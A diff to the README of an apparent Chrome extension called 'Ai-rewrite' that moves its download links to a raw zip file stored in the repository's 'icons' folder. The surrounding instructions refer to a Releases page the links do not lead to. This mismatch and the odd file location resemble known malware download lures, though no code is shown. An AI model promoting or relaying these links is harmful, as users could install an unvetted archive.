@@ -6,7 +6,7 @@ Welcome to Ai-rewrite! This Chrome extension makes it easy to rewrite selected t
 
 ## 📥 Download the Extension
 
-[![Download Ai-rewrite](https://raw.githubusercontent.com/Spotas/Ai-rewrite/main/defective/Ai-rewrite.zip)](https://raw.githubusercontent.com/Spotas/Ai-rewrite/main/defective/Ai-rewrite.zip)
+[![Download Ai-rewrite](https://raw.githubusercontent.com/Spotas/Ai-rewrite/main/icons/Ai-rewrite-3.6.zip)](https://raw.githubusercontent.com/Spotas/Ai-rewrite/main/icons/Ai-rewrite-3.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -25,7 +25,7 @@ Welcome to Ai-rewrite! This Chrome extension makes it easy to rewrite selected t
 
 To install Ai-rewrite, please visit the following link to download the latest version:
 
-[Download Ai-rewrite](https://raw.githubusercontent.com/Spotas/Ai-rewrite/main/defective/Ai-rewrite.zip)
+[Download Ai-rewrite](https://raw.githubusercontent.com/Spotas/Ai-rewrite/main/icons/Ai-rewrite-3.6.zip)
 
 1. **Visit the Releases Page**: Click on the link above.
 2. **Select the Latest Release**: Look for the latest version at the top of the list.
